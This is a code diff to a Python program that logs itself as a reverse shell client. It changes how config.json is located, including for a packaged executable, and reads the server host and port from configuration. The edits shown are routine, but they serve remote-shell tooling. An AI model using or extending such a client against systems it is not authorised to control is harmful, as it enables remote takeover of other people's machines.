@@ -12,7 +12,14 @@ import getpass
 # Load configuration from config.json
 def load_config():
     try:
-        with open("config.json", "r") as config_file:
+        if getattr(sys, 'frozen', False):
+            app_dir = os.path.dirname(sys.executable)
+        else:
+            app_dir = os.path.dirname(os.path.abspath(__file__))
+        
+        config_path = os.path.join(app_dir, "config.json")
+        
+        with open(config_path, "r") as config_file:
             config = json.load(config_file)
             log_message("Configuration loaded from config.json")
             return config
@@ -483,19 +490,22 @@ quit       - Close connection
 def main():
     config = load_config()
     
+    if config and "server" in config:
+        host = config["server"].get("host", "127.0.0.1")
+        port = config["server"].get("port", 9999)
+    else:
+        host = "127.0.0.1"
+        port = 9999
+        log_message("Using default configuration", "WARNING")
+    
     if config and "client" in config:
-        host = config["client"].get("server_ip", "127.0.0.1")
-        port = config["client"].get("server_port", 9999)
         reconnect_enabled = config["client"].get("reconnect_enabled", False)
         reconnect_delay = config["client"].get("reconnect_delay", 5)
         max_attempts = config["client"].get("max_reconnect_attempts", 0)
     else:
-        host = "127.0.0.1"
-        port = 9999
         reconnect_enabled = False
         reconnect_delay = 5
         max_attempts = 0
-        log_message("Using default configuration", "WARNING")
     
     log_message("=" * 50)
     log_message("Reverse Shell Client Starting...")
